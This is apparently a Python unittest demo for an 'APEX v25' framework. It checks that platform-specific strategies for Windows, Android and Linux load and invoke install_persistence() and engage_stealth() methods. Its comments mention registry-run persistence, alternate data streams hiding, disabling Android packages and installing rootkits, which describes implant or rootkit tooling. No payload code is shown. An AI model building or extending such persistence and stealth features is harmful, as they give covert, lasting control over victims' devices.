#!/usr/bin/env python3
import sys
import unittest
from unittest.mock import patch, MagicMock
from rich.console import Console
from rich.panel import Panel

console = Console()

class UniversalDemo(unittest.TestCase):
    def test_windows_mode(self):
        console.print("\n[SCENARIO] 🪟 Simulating Windows Environment...")
        with patch('sys.platform', 'win32'):
            from apex_framework.core.hal import PlatformHAL
            strategy = PlatformHAL.detect()
            self.assertEqual(strategy.__class__.__name__, "WindowsStrategy")
            strategy.install_persistence() # Should print REG ADD
            strategy.engage_stealth()      # Should print ADS

    def test_android_mode(self):
        console.print("\n[SCENARIO] 📱 Simulating Android Environment...")
        # Mock sys attribute check
        with patch('sys.getandroidapilevel', return_value=30, create=True):
            from apex_framework.core.hal import PlatformHAL
            strategy = PlatformHAL.detect()
            self.assertEqual(strategy.__class__.__name__, "AndroidStrategy")
            strategy.install_persistence() # Should print Termux
            strategy.engage_stealth()      # Should print pm disable

    def test_linux_mode(self):
        console.print("\n[SCENARIO] 🐧 Simulating Linux Environment...")
        with patch('sys.platform', 'linux'):
            # Ensure no android marker
            if hasattr(sys, 'getandroidapilevel'): del sys.getandroidapilevel

            from apex_framework.core.hal import PlatformHAL
            strategy = PlatformHAL.detect()
            self.assertEqual(strategy.__class__.__name__, "LinuxStrategy")
            # We mock the actual execution so we don't install rootkits on the dev box again
            with patch('apex_framework.ops.daemon.ServiceDaemon.persist') as mock_persist:
                strategy.install_persistence()
                mock_persist.assert_called_once()

if __name__ == "__main__":
    console.print(Panel("[bold green]APEX v25: UNIVERSAL COMPATIBILITY DEMO[/]", expand=False))
    unittest.main(argv=['first-arg-is-ignored'], exit=False)
